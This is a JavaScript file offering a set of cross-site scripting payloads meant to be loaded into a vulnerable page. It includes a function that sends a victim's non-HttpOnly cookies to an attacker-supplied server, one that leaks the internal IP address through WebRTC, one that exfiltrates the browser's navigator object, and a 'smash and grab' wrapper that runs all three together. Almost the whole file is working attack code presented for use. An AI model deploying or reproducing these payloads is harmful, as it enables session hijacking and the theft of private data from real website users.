/**
 *  A set of JavaScript payloads for XSS attacks. Can be either imported as a bundle
 *  here or as individual scripts.
 * 
 *  When importing as a bundle, two sets of script tags are needed: one to import
 *  the script, and the second to invoke the function. This may not be possible, 
 *  depending on the XSS vulnerability. 
 * 
 *  Usage:  <script src="http://myserver.com/script.js"></script>
 *          <script>function(parameter)</script>
 */

/**
 *  xssSmashAndGrab
 * 
 *  Take it all.
 * 
 *  Usage:  xssSmashAndGrab('http://myserver.com/')
 */
function xssSmashAndGrab(url) {
    xssCookieGrabber(url);
    xssIPGrabber(url);
    xssNavigatorGrabber(url);
}


/**
 *  xssAlert
 * 
 *  The Hello, World! of XSS PoCs.
 * 
 *  Usage:  xssAlert('Shia LaBeouf')
 */
function xssAlert(message) {
    alert(message);
}


/**
 *  xssCookieGrabber
 * 
 *  A function that sends all cookies not protected by HttpOnly via an XMLHttpRequest
 *  to the provided URL.
 * 
 *  Usage:  xssCookieGrabber('http://myserver.com/')
 */
function xssCookieGrabber(url) {
    // Construct the payload to send to the server
    var payload = '?cookies=' + document.cookie;

    // Construct and send the request
    var xmlHttp = new XMLHttpRequest();
    xmlHttp.open("GET", url + payload, true);
    xmlHttp.send();
}


/**
 *  xssIPGrabber
 * 
 *  A function that retrieves the internal IP address of the compromised client and sends it 
 *  to the provided URL.
 * 
 *  Usage:  xssIPGrabber('http://myserver.com/')
 */
function xssIPGrabber(url) {
    // Set up variables
    var IP;

    // Get the WebRTC connection, if supported by the browser
    window.RTCPeerConnection = window.RTCPeerConnection || window.mozRTCPeerConnection || window.webkitRTCPeerConnection || false;

    if (window.RTCPeerConnection) {
        // Create a connection
        var pc = new RTCPeerConnection({ iceServers: [] }), noop = function () { };
        pc.createDataChannel('');
        pc.createOffer(pc.setLocalDescription.bind(pc), noop);

        pc.onicecandidate = function (event) {
            if (event && event.candidate && event.candidate.candidate) {
                // Get the IP address
                var s = event.candidate.candidate.split('\n');
                IP = s[0].split(' ')[4];

                // Construct the payload to send to the server
                var payload = '?IP=' + IP;

                // Construct and send the request
                var xmlHttp = new XMLHttpRequest();
                xmlHttp.open("GET", url + payload, true);
                xmlHttp.send();
            }
        }
    }
}


/**
 *  xssNavigatorGrabber
 * 
 *  A function that retrieves window.navigator object and sends it  to the provided URL.
 *  window.navigator inclused some interesting things including the browser, OS, 
 *  architecture, geolocation and other interesting things.
 * 
 *  Usage:  xssNavigatorGrabber('http://myserver.com/')
 */
function xssNavigatorGrabber(url) {
    // Serialise the navigator object
    var _navigator = {};
    for (var i in navigator) _navigator[i] = navigator[i];
    var payload = '?navigator=' + JSON.stringify(_navigator);

    // Construct and send the request
    var xmlHttp = new XMLHttpRequest();
    xmlHttp.open("GET", url + payload, true);
    xmlHttp.send();
}
